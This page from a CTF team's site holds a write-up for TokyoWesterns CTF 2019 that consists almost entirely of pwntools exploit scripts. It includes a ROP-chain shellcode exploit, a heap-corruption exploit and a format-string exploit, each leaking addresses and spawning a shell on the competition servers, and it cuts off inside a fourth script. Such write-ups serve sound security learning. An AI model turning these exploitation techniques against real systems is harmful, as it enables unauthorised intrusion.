<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="apple-touch-icon" sizes="180x180" href="/assets/img/logo.png">
    <link rel="icon" type="image/png" sizes="192x192"  href="/assets/img/logo.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/assets/img/logo.png">
    <meta name="msapplication-TileColor" content="#ffffff">
    <meta name="msapplication-TileImage" content="/ms-icon-144x144.png">
    <meta name="theme-color" content="#ffffff">
    <title>TokyoWesterns CTF 5th 2019 WriteUp | r3kapig</title>
    <meta property="og:title" content="r3kapig writeup" />
    <meta property="og:locale" content="en_US" />
    <meta name="description" content="Writeup for TokyoWesterns CTF 5th 2019 WriteUp" />
    <meta property="og:description" content="Writeup for TokyoWesterns CTF 5th 2019 WriteUp" />
    <link rel="canonical" href="https://r3kapig.com/writeup/" />
    <meta property="og:url" content="https://r3kapig.com/writeup/" />
    <meta property="og:site_name" content="r3kapig" />
    <link type="text/css" rel="stylesheet" href="../assets/css/github-markdown.css">
    <link type="text/css" rel="stylesheet" href="../assets/css/pilcrow.css">
    <link type="text/css" rel="stylesheet" href="../assets/css/hljs-github.min.css"/>
    <link type="text/css" rel="stylesheet" href="../assets/css/bootstrap-4.0.0-beta.3.min.css">
    <script type="text/javascript" src="../assets/js/jquery-3.3.1.slim.min.js"></script>
    <script type="text/javascript" src="../assets/js/bootstrap-4.0.0-beta.3.min.js"></script>
    <script type="text/javascript" src="../assets/js/popper-1.14.3.min.js"></script>
    <script type="text/javascript" src="../assets/js/mathjax-2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
  </head>
  <style>
  body {
      padding-top: 56px;
  }

  .sticky-offset {
      top: 56px;
  }

  #body-row {
      margin-left:0;
      margin-right:0;
  }
  #sidebar-container {
      min-height: 100vh;   
      background-color: #333;
      padding: 0;
  }

  /* Sidebar sizes when expanded and expanded */
  .sidebar-expanded {
      width: 230px;
  }
  .sidebar-collapsed {
      width: 60px;
  }

  /* Menu item*/
  #sidebar-container .list-group a {
      height: 50px;
      color: white;
  }

  /* Submenu item*/
  #sidebar-container .list-group .sidebar-submenu a {
      height: 45px;
      padding-left: 60px;
  }
  .sidebar-submenu {
      font-size: 0.9rem;
  }

  /* Separators */
  .sidebar-separator-title {
      background-color: #333;
      height: 35px;
  }
  .sidebar-separator {
      background-color: #333;
      height: 25px;
  }
  .logo-separator {
      background-color: #333;    
      height: 60px;
  }


  /* 
   active scrollspy
  */
  .list-group-item.active {
    border-color: transparent;
    border-left: #e69138 solid 4px;
  }

  /* 
   anchor padding top
   https://stackoverflow.com/a/28824157
  */
  :target:before {
    content:"";
    display:block;
    height:56px; /* fixed header height*/
    margin:-56px 0 0; /* negative fixed header height */
  }
  </style>
  
  <script>
  // https://stackoverflow.com/a/48330533
  $(window).on('activate.bs.scrollspy', function (event) {
    let active_collapse = $($('.list-group-item.active').parents()[0]);
    $(".collapse").removeClass("show");
    active_collapse.addClass("show");

    let parent_menu = $('a[href="#' + active_collapse[0].id + '"]');
    $('a[href^="#submenu"]').css("border-left", "");
    parent_menu.css("border-left","#e69138 solid 4px");
  });

  // http://docs.mathjax.org/en/latest/tex.html#tex-and-latex-math-delimiters
  MathJax.Hub.Config({
    tex2jax: {
      inlineMath: [['$','$'], ['\\(','\\)']],
      processEscapes: true
    }
  });
  </script>

  <body style="position: relative;" data-spy="scroll" data-target=".sidebar-submenu" data-offset="70">
    <nav class="navbar navbar-expand-md navbar-light bg-light fixed-top">
      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarNavDropdown" aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="Toggle navigation">
        <span class="navbar-toggler-icon"></span>
      </button>
      <a class="navbar-brand" href="../">
        <img src="https://r3kapig.com/assets/img/logo.png" class="d-inline-block align-top" alt="" width="30" height="30">
        <span class="menu-collapsed">r3kapig / writeup</span>
      </a>
      <div class="collapse navbar-collapse" id="navbarNavDropdown">
        <ul class="navbar-nav my-2 my-lg-0">
            
            <li class="nav-item dropdown d-sm-block d-md-none">
              <iframe src="https://ghbtns.com/github-btn.html?user=r3kapig&repo=writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
              <iframe src="https://ghbtns.com/github-btn.html?user=r3kapig&repo=writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
        
              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                pwn
              </a>
              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
                                <a class="dropdown-item" href="#nothing-more-to-say">nothing-more-to-say</a>
    
                <a class="dropdown-item" href="#multi-heap">multi-heap</a>
    
                <a class="dropdown-item" href="#printf">printf</a>
    
                <a class="dropdown-item" href="#securekarte">securekarte</a>
    
                <a class="dropdown-item" href="#asterisk-alloc">asterisk-alloc</a>
    
              </div>
            </li>
    
            <li class="nav-item dropdown d-sm-block d-md-none">
              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                re
              </a>
              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
                                <a class="dropdown-item" href="#easy-crack-me">easy-crack-me</a>
    
                <a class="dropdown-item" href="#meow">meow</a>
    
                <a class="dropdown-item" href="#ebc">ebc</a>
    
                <a class="dropdown-item" href="#holy-grail-war">holy-grail-war</a>
    
              </div>
            </li>
    
            <li class="nav-item dropdown d-sm-block d-md-none">
              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                misc
              </a>
              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
                                <a class="dropdown-item" href="#welcome">welcome</a>
    
                <a class="dropdown-item" href="#survey">survey</a>
    
              </div>
            </li>
    
            <li class="nav-item dropdown d-sm-block d-md-none">
              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                crypto
              </a>
              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
                                <a class="dropdown-item" href="#real-baby-rsa">real-baby-rsa</a>
    
                <a class="dropdown-item" href="#simple-logic">simple-logic</a>
    
                <a class="dropdown-item" href="#happy!">happy!</a>
    
                <a class="dropdown-item" href="#m-poly-cipher">m-poly-cipher</a>
    
              </div>
            </li>
    
            <li class="nav-item dropdown d-sm-block d-md-none">
              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                web
              </a>
              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
                                <a class="dropdown-item" href="#j2x2j">j2x2j</a>
    
                <a class="dropdown-item" href="#php-note">php-note</a>
    
              </div>
            </li>
    
        </ul>
      </div>
      <div class="navbar-collapse collapse w-100 order-3 dual-collapse2">
        <ul class="navbar-nav ml-auto">
          <iframe src="https://ghbtns.com/github-btn.html?user=r3kapig&repo=writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
          <iframe src="https://ghbtns.com/github-btn.html?user=r3kapig&repo=writeup&type=star&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
        </ul>
      </div>
    </nav>
    <div class="row" id="body-row">
      <div id="sidebar-container" class="sidebar-expanded d-none d-md-block col-2">
        <ul class="list-group sticky-top sticky-offset">
          
          <a href="#submenu0" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
              <span class="fa fa-dashboard fa-fw mr-3"></span>
              <span class="menu-collapsed">pwn</span>
              <span class="submenu-icon ml-auto"></span>
            </div>
          </a>
          <div id="submenu0" class="collapse sidebar-submenu">
            <a href="#nothing-more-to-say" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">nothing-more-to-say</span>
            </a>
    
<a href="#multi-heap" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">multi-heap</span>
            </a>
    
<a href="#printf" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">printf</span>
            </a>
    
<a href="#securekarte" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">securekarte</span>
            </a>
    
<a href="#asterisk-alloc" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">asterisk-alloc</span>
            </a>
    
          </div>
    
          <a href="#submenu1" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
              <span class="fa fa-dashboard fa-fw mr-3"></span>
              <span class="menu-collapsed">re</span>
              <span class="submenu-icon ml-auto"></span>
            </div>
          </a>
          <div id="submenu1" class="collapse sidebar-submenu">
            <a href="#easy-crack-me" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">easy-crack-me</span>
            </a>
    
<a href="#meow" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">meow</span>
            </a>
    
<a href="#ebc" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">ebc</span>
            </a>
    
<a href="#holy-grail-war" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">holy-grail-war</span>
            </a>
    
          </div>
    
          <a href="#submenu2" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
              <span class="fa fa-dashboard fa-fw mr-3"></span>
              <span class="menu-collapsed">misc</span>
              <span class="submenu-icon ml-auto"></span>
            </div>
          </a>
          <div id="submenu2" class="collapse sidebar-submenu">
            <a href="#welcome" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">welcome</span>
            </a>
    
<a href="#survey" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">survey</span>
            </a>
    
          </div>
    
          <a href="#submenu3" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
              <span class="fa fa-dashboard fa-fw mr-3"></span>
              <span class="menu-collapsed">crypto</span>
              <span class="submenu-icon ml-auto"></span>
            </div>
          </a>
          <div id="submenu3" class="collapse sidebar-submenu">
            <a href="#real-baby-rsa" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">real-baby-rsa</span>
            </a>
    
<a href="#simple-logic" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">simple-logic</span>
            </a>
    
<a href="#happy!" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">happy!</span>
            </a>
    
<a href="#m-poly-cipher" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">m-poly-cipher</span>
            </a>
    
          </div>
    
          <a href="#submenu4" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
              <span class="fa fa-dashboard fa-fw mr-3"></span>
              <span class="menu-collapsed">web</span>
              <span class="submenu-icon ml-auto"></span>
            </div>
          </a>
          <div id="submenu4" class="collapse sidebar-submenu">
            <a href="#j2x2j" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">j2x2j</span>
            </a>
    
<a href="#php-note" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">php-note</span>
            </a>
    
          </div>
    
        </ul>
      </div>
      <div class="col-10 py-3">
        <article class="markdown-body"><h1 id="tokyowesterns-ctf-5th-2019-writeup"><a class="header-link" href="#tokyowesterns-ctf-5th-2019-writeup"></a>TokyoWesterns CTF 5th 2019 WriteUp</h1>
<h2 id="pwn"><a class="header-link" href="#pwn"></a>Pwn</h2>
<h3 id="nothing-more-to-say"><a class="header-link" href="#nothing-more-to-say"></a>nothing more to say</h3>
<pre class="hljs"><code><span class="hljs-comment">#! /usr/bin/env python2</span>
<span class="hljs-comment"># -*- coding: utf-8 -*-</span>
<span class="hljs-comment"># vim:fenc=utf-8</span>
<span class="hljs-comment">#</span>
<span class="hljs-comment"># Copyright © 2018 anciety &lt;anciety@anciety-pc&gt;</span>
<span class="hljs-comment">#</span>
<span class="hljs-comment"># Distributed under terms of the MIT license.</span>
<span class="hljs-keyword">import</span> sys
<span class="hljs-keyword">import</span> os
<span class="hljs-keyword">import</span> os.path
<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
context(os=<span class="hljs-string">'linux'</span>, arch=<span class="hljs-string">'amd64'</span>, log_level=<span class="hljs-string">'debug'</span>)
context.terminal = [<span class="hljs-string">'ancyterm'</span>, <span class="hljs-string">'-s'</span>, <span class="hljs-string">'192.168.142.1'</span>, <span class="hljs-string">'-t'</span>, <span class="hljs-string">'alacritty'</span>, <span class="hljs-string">'-e'</span>]

<span class="hljs-comment"># synonyms for faster typing</span>
tube.s = tube.send
tube.sl = tube.sendline
tube.sa = tube.sendafter
tube.sla = tube.sendlineafter
tube.r = tube.recv
tube.ru = tube.recvuntil
tube.rl = tube.recvline
tube.rr = tube.recvregex
tube.irt = tube.interactive

<span class="hljs-keyword">if</span> len(sys.argv) &gt; <span class="hljs-number">2</span>:
    DEBUG = <span class="hljs-number">0</span>
    HOST = sys.argv[<span class="hljs-number">1</span>]
    PORT = int(sys.argv[<span class="hljs-number">2</span>])

    p = remote(HOST, PORT)
<span class="hljs-keyword">else</span>:
    DEBUG = <span class="hljs-number">1</span>
    <span class="hljs-keyword">if</span> len(sys.argv) == <span class="hljs-number">2</span>:
        PATH = sys.argv[<span class="hljs-number">1</span>]

    p = process(PATH)


<span class="hljs-comment"># by w1tcher who dominates pwnable challenges</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">house_of_orange</span><span class="hljs-params">(head_addr, system_addr, io_list_all)</span>:</span>
    payload = <span class="hljs-string">b'/bin/sh\x00'</span>
    payload = payload + p64(<span class="hljs-number">0x61</span>) + p64(<span class="hljs-number">0</span>) + p64(io_list_all - <span class="hljs-number">16</span>)
    payload = payload + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">1</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">9</span> + p64(system_addr) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span>
    payload = payload + p64(head_addr + <span class="hljs-number">18</span> * <span class="hljs-number">8</span>) + p64(<span class="hljs-number">2</span>) + p64(<span class="hljs-number">3</span>) + p64(<span class="hljs-number">0</span>) + \
            p64(<span class="hljs-number">0xffffffffffffffff</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(head_addr + <span class="hljs-number">12</span> * <span class="hljs-number">8</span>)
    <span class="hljs-keyword">return</span> payload


orig_attach = gdb.attach
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">gdb_attach</span><span class="hljs-params">(*args, **kwargs)</span>:</span>
    <span class="hljs-keyword">if</span> DEBUG:
        orig_attach(*args, **kwargs)
gdb.attach = gdb_attach


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>:</span>
    <span class="hljs-comment"># Your exploit script goes here</span>
    p.ru(<span class="hljs-string">':)\n'</span>)
    pop_rdi = <span class="hljs-number">0x400773</span>
    gets = <span class="hljs-number">0x400580</span>

    ropchain = p64(pop_rdi)
    ropchain += p64(<span class="hljs-number">0x601090</span>)
    ropchain += p64(gets)
    ropchain += p64(<span class="hljs-number">0x601090</span>)

    payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">0x108</span> + ropchain

    shellcode = shellcraft.sh()
    gdb.attach(p)
    p.sl(payload)
    p.sl(asm(shellcode))
    p.irt()

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
    main()

</code></pre><h3 id="multi-heap"><a class="header-link" href="#multi-heap"></a>Multi Heap</h3>
<pre class="hljs"><code><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
context.log_level = <span class="hljs-string">'debug'</span>

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Alloc</span><span class="hljs-params">(which, size, where)</span>:</span>
    p.recvuntil(<span class="hljs-string">'Your choice: '</span>)
    p.sendline(<span class="hljs-string">'1'</span>)
    p.recvuntil(<span class="hljs-string">'Which: '</span>)
    p.sendline(which)
    p.recvuntil(<span class="hljs-string">'Size: '</span>)
    p.sendline(str(size))
    p.recvuntil(<span class="hljs-string">'(m/t): '</span>)
    p.sendline(where)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Free</span><span class="hljs-params">(idx)</span>:</span>
    p.recvuntil(<span class="hljs-string">'Your choice: '</span>)
    p.sendline(<span class="hljs-string">'2'</span>)
    p.recvuntil(<span class="hljs-string">'Index: '</span>)
    p.sendline(str(idx))

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Free_s</span><span class="hljs-params">(idx)</span>:</span>
    <span class="hljs-keyword">return</span> <span class="hljs-string">'2\n'</span> + str(idx) + <span class="hljs-string">'\n'</span>

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Write</span><span class="hljs-params">(idx)</span>:</span>
    p.recvuntil(<span class="hljs-string">'Your choice: '</span>)
    p.sendline(<span class="hljs-string">'3'</span>)
    p.recvuntil(<span class="hljs-string">'Index: '</span>)
    p.sendline(str(idx))

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Read</span><span class="hljs-params">(idx, size, buf)</span>:</span>
    p.recvuntil(<span class="hljs-string">'Your choice: '</span>)
    p.sendline(<span class="hljs-string">'4'</span>)
    p.recvuntil(<span class="hljs-string">'Index: '</span>)
    p.sendline(str(idx))
    p.recvuntil(<span class="hljs-string">'Size: '</span>)
    p.sendline(str(size))
    p.recvuntil(<span class="hljs-string">'Content: '</span>)
    p.send(buf)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Copy</span><span class="hljs-params">(src_idx, dst_idx, size, ch)</span>:</span>
    p.recvuntil(<span class="hljs-string">'Your choice: '</span>)
    p.sendline(<span class="hljs-string">'5'</span>)
    p.recvuntil(<span class="hljs-string">'Src index: '</span>)
    p.sendline(str(src_idx))
    p.recvuntil(<span class="hljs-string">'Dst index: '</span>)
    p.sendline(str(dst_idx))
    p.recvuntil(<span class="hljs-string">'Size: '</span>)
    p.sendline(str(size))
    p.recvuntil(<span class="hljs-string">'(y/n): '</span>)
    p.sendline(ch)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Copy_s</span><span class="hljs-params">(src_idx, dst_idx, size, ch)</span>:</span>
    <span class="hljs-keyword">return</span> <span class="hljs-string">'5\n'</span> + str(src_idx) + <span class="hljs-string">'\n'</span> + str(dst_idx) + <span class="hljs-string">'\n'</span> + str(size) + <span class="hljs-string">'\n'</span> + ch + <span class="hljs-string">'\n'</span>

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">GameStart</span><span class="hljs-params">(ip, port, debug)</span>:</span>
    <span class="hljs-keyword">global</span> p
    <span class="hljs-keyword">if</span> debug == <span class="hljs-number">1</span>:
        p = process(<span class="hljs-string">'./multi_heap'</span>, env = {<span class="hljs-string">'LD_PRELOAD'</span> : <span class="hljs-string">'./libc.so.6'</span>})
    <span class="hljs-keyword">else</span>:
        p = remote(ip, port)
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">3</span>):
        Alloc(<span class="hljs-string">'long'</span>, <span class="hljs-number">0x500</span>, <span class="hljs-string">'m'</span>)

    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">2</span>):
        Free(<span class="hljs-number">0</span>)
    Alloc(<span class="hljs-string">'long'</span>, <span class="hljs-number">0x500</span>, <span class="hljs-string">'m'</span>)
    Alloc(<span class="hljs-string">'long'</span>, <span class="hljs-number">0x500</span>, <span class="hljs-string">'m'</span>)
    Write(<span class="hljs-number">1</span>)
    libc_addr = int(p.recvline()) - <span class="hljs-number">0x3ebca0</span>
    heap_addr = int(p.recvline()) - <span class="hljs-number">0x123f0</span>
    log.info(<span class="hljs-string">'libc addr is : '</span> + hex(libc_addr))
    log.info(<span class="hljs-string">'heap addr is : '</span> + hex(heap_addr))
    Alloc(<span class="hljs-string">'char'</span>, <span class="hljs-number">0x100</span>, <span class="hljs-string">'m'</span>)
    Alloc(<span class="hljs-string">'char'</span>, <span class="hljs-number">0x100</span>, <span class="hljs-string">'m'</span>)
    Read(<span class="hljs-number">4</span>, <span class="hljs-number">8</span>, p64(heap_addr + <span class="hljs-number">0x12fe0</span>))
    <span class="hljs-comment"># p.recv(1024)</span>
    <span class="hljs-comment"># p.sendline('10')</span>
    <span class="hljs-comment"># Copy(4, 3, 8, 'y')</span>
    <span class="hljs-comment"># Write(3)</span>
    <span class="hljs-comment"># Write(4)</span>
    <span class="hljs-comment"># Free(3)</span>
    buf = Copy_s(<span class="hljs-number">4</span>, <span class="hljs-number">3</span>, <span class="hljs-number">8</span>, <span class="hljs-string">'y'</span>) + Free_s(<span class="hljs-number">3</span>)
    p.send(buf)
    Alloc(<span class="hljs-string">'char'</span>, <span class="hljs-number">0x100</span>, <span class="hljs-string">'m'</span>)
    Alloc(<span class="hljs-string">'char'</span>, <span class="hljs-number">0x100</span>, <span class="hljs-string">'m'</span>)
    Write(<span class="hljs-number">5</span>)
    data = p.recvline()
    <span class="hljs-keyword">if</span> <span class="hljs-string">'=='</span> <span class="hljs-keyword">in</span> data:
        <span class="hljs-keyword">print</span> <span class="hljs-string">'error !'</span>
        <span class="hljs-keyword">return</span>

    one_gadget = <span class="hljs-number">0x4f2c5</span>
    one_gadget = <span class="hljs-number">0x4f322</span>
    <span class="hljs-comment"># one_gadget = 0xe569f</span>
    <span class="hljs-comment"># one_gadget = 0xe5858</span>
    <span class="hljs-comment"># one_gadget = 0xe585f</span>
    <span class="hljs-comment"># one_gadget = 0xe5863</span>
    <span class="hljs-comment"># one_gadget = 0x10a38c</span>
    <span class="hljs-comment"># one_gadget = 0x10a398</span>

    pie_addr = u64(data[ : <span class="hljs-number">-1</span>] + <span class="hljs-string">'\x00'</span> * <span class="hljs-number">2</span>) - <span class="hljs-number">0x205bc8</span>
    log.info(<span class="hljs-string">'pie addr is : '</span> + hex(pie_addr))
    payload = p64(heap_addr + <span class="hljs-number">0x12fe0</span> + <span class="hljs-number">0x20</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(one_gadget + libc_addr) * <span class="hljs-number">4</span>
    Read(<span class="hljs-number">5</span>, len(payload), payload)

    Free(<span class="hljs-number">3</span>)

    <span class="hljs-comment"># gdb.attach(p)</span>

    p.interactive()

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
    GameStart(<span class="hljs-string">'multiheap.chal.ctf.westerns.tokyo'</span>, <span class="hljs-number">10001</span>, <span class="hljs-number">0</span>)</code></pre><h3 id="printf"><a class="header-link" href="#printf"></a>printf</h3>
<pre class="hljs"><code>from pwn import *

context.log_level = <span class="hljs-string">'debug'</span>

def GameStart(ip, port, <span class="hljs-keyword">debug</span>):
    <span class="hljs-keyword">global</span> <span class="hljs-keyword">p</span>
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">debug</span> == <span class="hljs-number">1</span>:
        # <span class="hljs-keyword">p</span> = process([<span class="hljs-string">'./ld-linux.so.2'</span>, <span class="hljs-string">'./printf'</span>], env = {<span class="hljs-string">"LD_PRELOAD"</span> : <span class="hljs-string">'./libc.so.6'</span>})
        <span class="hljs-keyword">p</span> = process(<span class="hljs-string">'./printf'</span>, env = {<span class="hljs-string">"LD_PRELOAD"</span> : <span class="hljs-string">'./libc.so.6'</span>})
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">p</span> = remote(ip, port)

    # gdb.attach(pidof(<span class="hljs-keyword">p</span>)[<span class="hljs-number">0</span>])
    raw_input(<span class="hljs-string">'wait to debug'</span>)
    <span class="hljs-keyword">p</span>.recvuntil(<span class="hljs-string">'name?\n'</span>)
    <span class="hljs-keyword">p</span>.sendline(<span class="hljs-string">'%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x|%llx|%x%x%x%x%x%x%x%x%x|%llx|%llx|%llx|'</span>)

    data = <span class="hljs-keyword">p</span>.recvuntil(<span class="hljs-string">'Do you'</span>)
    idx = data.<span class="hljs-built_in">index</span>(<span class="hljs-string">'|'</span>)
    stack_base = <span class="hljs-keyword">int</span>(data[idx + <span class="hljs-number">1</span> : data.<span class="hljs-built_in">index</span>(<span class="hljs-string">'|'</span>, idx + <span class="hljs-number">1</span>)], <span class="hljs-number">16</span>) - <span class="hljs-number">0</span>x266 -<span class="hljs-number">0</span>x10
    idx = data.<span class="hljs-built_in">index</span>(<span class="hljs-string">'|'</span>, idx + <span class="hljs-number">1</span>)
    idx = data.<span class="hljs-built_in">index</span>(<span class="hljs-string">'|'</span>, idx + <span class="hljs-number">1</span>)
    canary = <span class="hljs-keyword">int</span>(data[idx + <span class="hljs-number">1</span> : data.<span class="hljs-built_in">index</span>(<span class="hljs-string">'|'</span>, idx + <span class="hljs-number">1</span>)], <span class="hljs-number">16</span>)
    idx = data.<span class="hljs-built_in">index</span>(<span class="hljs-string">'|'</span>, idx + <span class="hljs-number">1</span>)
    pie_base = <span class="hljs-keyword">int</span>(data[idx + <span class="hljs-number">1</span> : data.<span class="hljs-built_in">index</span>(<span class="hljs-string">'|'</span>, idx + <span class="hljs-number">1</span>)], <span class="hljs-number">16</span>)
    idx = data.<span class="hljs-built_in">index</span>(<span class="hljs-string">'|'</span>, idx + <span class="hljs-number">1</span>)
    libc_base = <span class="hljs-keyword">int</span>(data[idx + <span class="hljs-number">1</span> : data.<span class="hljs-built_in">index</span>(<span class="hljs-string">'|'</span>, idx + <span class="hljs-number">1</span>)], <span class="hljs-number">16</span>) - <span class="hljs-number">0</span>x26b6b

    <span class="hljs-built_in">log</span>.info(<span class="hljs-string">"stack base is : "</span> + hex(stack_base))
    <span class="hljs-built_in">log</span>.info(<span class="hljs-string">"canary is : "</span> + hex(canary))
    <span class="hljs-built_in">log</span>.info(<span class="hljs-string">"pie base is : "</span> + hex(pie_base))
    <span class="hljs-built_in">log</span>.info(<span class="hljs-string">"libc base is : "</span> + hex(libc_base))

    strlen_got_offest = <span class="hljs-number">0</span>x1E40A8 + libc_base 
    system_offest = <span class="hljs-number">0</span>x52FD0 + libc_base
    one_gadget = <span class="hljs-number">0</span>x106ef8 + libc_base
    offest = stack_base - strlen_got_offest - <span class="hljs-number">23</span> + <span class="hljs-number">8</span> - <span class="hljs-number">0</span>x10

    payload = <span class="hljs-string">"/bin/sh;%c"</span> + <span class="hljs-string">'%c'</span> * <span class="hljs-number">26</span> + <span class="hljs-string">';'</span> * <span class="hljs-number">5</span> + p64(one_gadget)[ : <span class="hljs-number">6</span>] + <span class="hljs-string">'%%%dc'</span> % offest + <span class="hljs-string">'%c'</span> + <span class="hljs-string">';'</span> * <span class="hljs-number">8</span> + <span class="hljs-string">'%c'</span> * (<span class="hljs-number">8</span> * <span class="hljs-number">4</span> - <span class="hljs-number">26</span>)
    payload = payload.ljust(<span class="hljs-number">0</span>x100, <span class="hljs-string">'\x00'</span>)
    <span class="hljs-keyword">p</span>.recvuntil(<span class="hljs-string">"comment?\n"</span>)
    <span class="hljs-keyword">p</span>.sendline(payload)

    <span class="hljs-keyword">p</span>.interactive()

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
    GameStart(<span class="hljs-string">'printf.chal.ctf.westerns.tokyo'</span>, <span class="hljs-number">10001</span>, <span class="hljs-number">0</span>)</code></pre><h3 id="securekarte"><a class="header-link" href="#securekarte"></a>SecureKarte</h3>
<pre class="hljs"><code><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
context.log_level = <span class="hljs-string">'debug'</span>

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(sz, des)</span>:</span>
    p.recvuntil(<span class="hljs-string">'&gt; '</span>)
    p.sendline(<span class="hljs-string">'1'</span>)
    p.recvuntil(<span class="hljs-string">' &gt; '</span>)
    p.sendline(str(sz))
    p.recvuntil(<span class="hljs-string">' &gt; '</span>)
    p.send(des)
    p.recvuntil(<span class="hljs-string">'Added id '</span>)
    <span class="hljs-keyword">return</span> int(p.recvline()[ : <span class="hljs-number">-1</span>])

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span><span class="hljs-params">(idx)</span>:</span>
    p.recvuntil(<span class="hljs-string">'&gt; '</span>)
    p.sendline(<span class="hljs-string">'3'</span>)
    p.recvuntil(<span class="hljs-string">' &gt; '</span>)
    p.sendline(str(idx))

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">modify</span><span class="hljs-params">(idx, des)</span>:</span>
    p.recvuntil(<span class="hljs-string">'&gt; '</span>)
    p.sendline(<span class="hljs-string">'4'</span>)
    p.recvuntil(<span class="hljs-string">' &gt; '</span>)
    p.sendline(str(idx))
    p.recvuntil(<span class="hljs-string">' &gt; '</span>)
    p.send(des)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">rename</span><span class="hljs-params">(name)</span>:</span>
    p.recvuntil(<span class="hljs-string">'&gt; '</span>)
